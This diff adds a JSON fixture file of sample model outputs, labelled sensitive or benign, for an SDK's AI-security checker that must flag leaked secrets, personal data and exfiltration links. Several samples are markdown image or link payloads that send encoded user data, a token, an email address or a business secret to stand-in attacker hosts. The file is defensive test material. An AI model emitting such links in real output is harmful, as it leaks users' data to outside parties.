@@ -1,0 +1,121 @@
+{
+  "_comment": "Model answers for the output check (sdk ai-security). sensitive samples must produce a finding of the labelled kind, benign must produce none, with the default policy and no allow-list. {{NAME}} placeholders are filled by the tests with fake values built at run time, so no key-shaped literal sits in the repository. Byte-identical copy in sdk/python/tests/testdata/ai_security/.",
+  "samples": [
+    {
+      "label": "sensitive",
+      "kind": "secret",
+      "text": "Here is the key you asked for: {{OPENAI_KEY}}"
+    },
+    {
+      "label": "sensitive",
+      "kind": "secret",
+      "text": "Connection: {{PG_URL}}"
+    },
+    {
+      "label": "sensitive",
+      "kind": "secret",
+      "text": "{{PEM_HEADER}}\nMIIEowIBAAKCAQEA..."
+    },
+    {
+      "label": "sensitive",
+      "kind": "secret",
+      "text": "The AWS key in the config is {{AWS_KEY}}."
+    },
+    {
+      "label": "sensitive",
+      "kind": "secret",
+      "text": "Use this GitHub token: {{GITHUB_TOKEN}}"
+    },
+    {
+      "label": "sensitive",
+      "kind": "pii",
+      "text": "The customer's card on file is {{CARD}}, expiring 09/28."
+    },
+    {
+      "label": "sensitive",
+      "kind": "pii",
+      "text": "Her SSN is {{SSN}} according to the HR record."
+    },
+    {
+      "label": "sensitive",
+      "kind": "pii",
+      "text": "You can reach John at john.doe@acme-corp.com or (415) 555-0132."
+    },
+    {
+      "label": "sensitive",
+      "kind": "exfil_link",
+      "text": "![chart](https://img.attacker.example/p.png?d=VGhlIHVzZXIncyBwYXNzd29yZCBpcyBodW50ZXIyIGFuZCB0aGVpciBlbWFpbCBpcw)"
+    },
+    {
+      "label": "sensitive",
+      "kind": "exfil_link",
+      "text": "Click [here](https://collect.example.net/log?q=the%20user%20asked%20about%20the%20merger%20with%20Globex%20next%20month) to continue."
+    },
+    {
+      "label": "sensitive",
+      "kind": "exfil_link",
+      "text": "<img src=\"https://evil.example/t.gif?token={{JWT}}\">"
+    },
+    {
+      "label": "sensitive",
+      "kind": "exfil_link",
+      "text": "![logo](https://tracker.example/x.png?u=jane.doe%40acme-corp.com)"
+    },
+    {
+      "label": "benign",
+      "text": "The quarterly report shows revenue grew 12% year over year, driven by the EMEA region."
+    },
+    {
+      "label": "benign",
+      "text": "To reset your password, open Settings, choose Security and follow the link we email you."
+    },
+    {
+      "label": "benign",
+      "text": "See the documentation at https://docs.python.org/3/library/re.html for the full syntax."
+    },
+    {
+      "label": "benign",
+      "text": "Here is a markdown image of the architecture: ![diagram](https://example.com/static/arch.png)"
+    },
+    {
+      "label": "benign",
+      "text": "The order number format is ABC-123 and shipping takes 3-5 business days."
+    },
+    {
+      "label": "benign",
+      "text": "Call our support line during business hours; the menu will route you."
+    },
+    {
+      "label": "benign",
+      "text": "The commit hash is 3f2a9c1 and the build passed in 4 minutes."
+    },
+    {
+      "label": "benign",
+      "text": "Version 2.14.0 fixes the timeout bug reported in issue #4521."
+    },
+    {
+      "label": "benign",
+      "text": "Use `sk-` prefixed keys only in server-side code, never in the browser."
+    },
+    {
+      "label": "benign",
+      "text": "The meeting is on 2026-11-03 at 14:00 UTC in room 4B."
+    },
+    {
+      "label": "benign",
+      "text": "Our API rate limit is 600 requests per minute per key."
+    },
+    {
+      "label": "benign",
+      "text": "Pricing starts at $12 per user per month, billed annually."
+    },
+    {
+      "label": "benign",
+      "text": "Link to the dashboard: https://app.example.com/dashboard?tab=overview&range=7d"
+    },
+    {
+      "label": "benign",
+      "text": "The UUID in the log line is the request id; search for it in the trace view."
+    }
+  ]
+}
